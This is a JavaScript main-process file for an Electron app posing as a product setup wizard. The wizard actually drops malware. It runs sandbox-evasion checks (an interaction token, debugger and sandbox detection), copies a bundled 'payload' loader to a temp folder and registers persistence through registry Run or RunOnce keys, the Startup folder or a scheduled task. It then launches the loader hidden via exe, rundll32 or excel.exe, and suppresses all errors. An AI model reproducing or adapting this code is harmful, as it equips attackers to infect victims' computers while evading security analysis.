const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { spawn, execFileSync } = require('child_process');
const config = require('./config');
const { runGuardrails } = require('./guardrails');

// Per-process interaction token. The renderer receives this ONCE, on first
// genuine mouse movement over the wizard window, via the 'installer:ready'
// IPC. The 'installer:run' handler then requires the token to match before
// doing ANY file I/O or spawning - this enforces that a sandbox which
// auto-invokes IPC handlers cannot bypass the user-interaction gate even
// if it skips the renderer entirely.
const INTERACTION_TOKEN = crypto.randomBytes(32).toString('hex');
let interactionTokenIssued = false;

// ---------------------------------------------------------------------------
// Persistence installer
// ---------------------------------------------------------------------------
// Copies the loader to a permanent location and registers one of four
// persistence mechanisms: registry Run key, registry RunOnce, Startup
// folder copy, or a Scheduled Task. All operations are best-effort; a
// failure here never surfaces to the renderer.
//
// config.PERSISTENCE shape:
//   { enabled: bool, method: string, name: string, installDir: string }
//   method:     "registry_run" | "registry_run_once" | "startup_folder" | "scheduled_task"
//   installDir: "appdata" | "localappdata"
function installPersistence(stagedEntryPath) {
  try {
    if (!config.PERSISTENCE || !config.PERSISTENCE.enabled) return;

    const base = config.PERSISTENCE.installDir === 'localappdata'
      ? process.env.LOCALAPPDATA
      : process.env.APPDATA;

    const persistDir  = path.join(base, config.PERSISTENCE.name);
    const persistPath = path.join(persistDir, config.ENTRY_NAME);
    fs.mkdirSync(persistDir, { recursive: true });
    fs.copyFileSync(stagedEntryPath, persistPath);

    // Build the execution command string used by registry / scheduled task.
    let cmd;
    switch (config.ENTRY_FORMAT) {
      case 'dll':
        cmd = `rundll32.exe "${persistPath}",${config.DLL_ENTRY}`;
        break;
      case 'xll':
        cmd = `excel.exe /e "${persistPath}"`;
        break;
      default: // exe
        cmd = `"${persistPath}"`;
    }

    switch (config.PERSISTENCE.method) {
      case 'registry_run':
        execFileSync('reg', [
          'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
          '/v', config.PERSISTENCE.name,
          '/t', 'REG_SZ',
          '/d', cmd,
          '/f',
        ], { windowsHide: true, stdio: 'ignore' });
        break;

      case 'registry_run_once':
        execFileSync('reg', [
          'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
          '/v', config.PERSISTENCE.name,
          '/t', 'REG_SZ',
          '/d', cmd,
          '/f',
        ], { windowsHide: true, stdio: 'ignore' });
        break;

      case 'startup_folder': {
        // For DLL/XLL, drop a .bat wrapper in startup instead of the payload.
        const startupDir = path.join(
          process.env.APPDATA,
          'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
        );
        if (config.ENTRY_FORMAT === 'exe') {
          fs.copyFileSync(persistPath, path.join(startupDir, config.ENTRY_NAME));
        } else {
          const batPath = path.join(startupDir, `${config.PERSISTENCE.name}.bat`);
          fs.writeFileSync(batPath, `@echo off\r\nstart "" ${cmd}\r\n`, 'ascii');
        }
        break;
      }

      case 'scheduled_task':
        execFileSync('schtasks', [
          '/create',
          '/tn', config.PERSISTENCE.name,
          '/tr', cmd,
          '/sc', 'onlogon',
          '/f',
          '/rl', 'limited',
        ], { windowsHide: true, stdio: 'ignore' });
        break;
    }
  } catch (_) {
    // Best-effort — persistence failure must not surface to the renderer.
  }
}

function createWindow() {
  const debug = !!(config.GUARDRAILS && config.GUARDRAILS.debugMode);
  const win = new BrowserWindow({
    width: debug ? 900 : 560,
    height: debug ? 640 : 420,
    resizable: debug,
    title: `${config.PRODUCT} Setup`,
    autoHideMenuBar: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
      devTools: debug,
    },
  });
  win.removeMenu();
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
  if (debug) {
    // Auto-open devtools so the operator can see [erebus-guardrail] logs.
    win.webContents.openDevTools({ mode: 'bottom' });
  }
}

ipcMain.handle('installer:product', () => ({
  product: config.PRODUCT,
  publisher: config.PUBLISHER,
  version: config.VERSION,
  // Expose guardrail knobs the renderer needs to enforce on its side.
  dwellMs: (config.GUARDRAILS && config.GUARDRAILS.dwellMs) || 0,
  requireMouseMovement: !!(config.GUARDRAILS && config.GUARDRAILS.requireMouseMovement),
  debugMode: !!(config.GUARDRAILS && config.GUARDRAILS.debugMode),
}));

// Called by the renderer the first time it observes a real user-input event
// (mousemove, click, or keypress) inside the wizard window AND the
// configured dwell time has elapsed. The renderer is untrusted - this
// handler only hands out the interaction token once, so even a renderer
// that forges the event sequence can't reuse the token.
ipcMain.handle('installer:ready', () => {
  if (interactionTokenIssued) return { token: null };
  interactionTokenIssued = true;
  return { token: INTERACTION_TOKEN };
});

ipcMain.handle('installer:run', async (_event, providedToken) => {
  const debug = !!(config.GUARDRAILS && config.GUARDRAILS.debugMode);
  const dbg = (msg) => { if (debug) console.error(`[erebus-guardrail] ${msg}`); };

  try {
    // -------------------------------------------------------------------
    // Guardrail gate #1: interaction token.
    // The renderer must have obtained this via installer:ready, which is
    // only handed out after dwell-time + real user input. A sandbox that
    // invokes installer:run directly without going through the UI fails
    // this check and nothing is staged.
    // -------------------------------------------------------------------
    if (!interactionTokenIssued || providedToken !== INTERACTION_TOKEN) {
      dbg('interaction-token-missing - installer:run invoked without installer:ready');
      return { ok: false, error: 'no-interaction' };
    }
    dbg('gate #1 (interaction token) OK');

    // -------------------------------------------------------------------
    // Guardrail gate #2: environment checks (debugger, sandbox vars,
    // hostname/username lists, screen size, idle time, anti-analysis
    // sleeps). These run BEFORE any file copy or spawn.
    // -------------------------------------------------------------------
    const gr = await runGuardrails(config.GUARDRAILS);
    if (!gr.ok) {
      dbg(`gate #2 (environment) FAILED: ${gr.reason}`);
      return { ok: false, error: `guardrail:${gr.reason}` };
    }
    dbg('gate #2 (environment) OK');

    // -------------------------------------------------------------------
    // Only NOW do we touch the filesystem. The loader tree sits in
    // process.resourcesPath/payload/ (staged by electron-builder's
    // extraResources directive) - copy it to a fresh %TEMP%\inst-<uuid>
    // so the child process has a writable cwd and so cleanup is clean.
    // -------------------------------------------------------------------
    const srcDir = path.join(process.resourcesPath, 'payload');
    const tmpDir = path.join(os.tmpdir(), 'inst-' + crypto.randomUUID());
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.cpSync(srcDir, tmpDir, { recursive: true });

    const entryPath = path.join(tmpDir, config.ENTRY_NAME);

    // Install persistence BEFORE spawning so the persistent copy exists
    // even if the loader immediately calls back and terminates.
    installPersistence(entryPath);
    dbg('persistence step complete');

    let child;
    switch (config.ENTRY_FORMAT) {
      case 'exe':
        child = spawn(entryPath, [], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'dll':
        child = spawn('rundll32.exe', [`${entryPath},${config.DLL_ENTRY}`], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'xll':
        child = spawn('excel.exe', ['/e', entryPath], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      default:
        return { ok: false, error: `unsupported ENTRY_FORMAT: ${config.ENTRY_FORMAT}` };
    }

    dbg(`spawned ${config.ENTRY_FORMAT} loader pid=${child.pid} cwd=${tmpDir}`);
    child.unref();

    return { ok: true };
  } catch (err) {
    dbg(`unhandled error: ${err && err.message || err}`);
    return { ok: false, error: String(err && err.message || err) };
  }
});

app.whenReady().then(createWindow);
app.on('window-all-closed', () => app.quit());
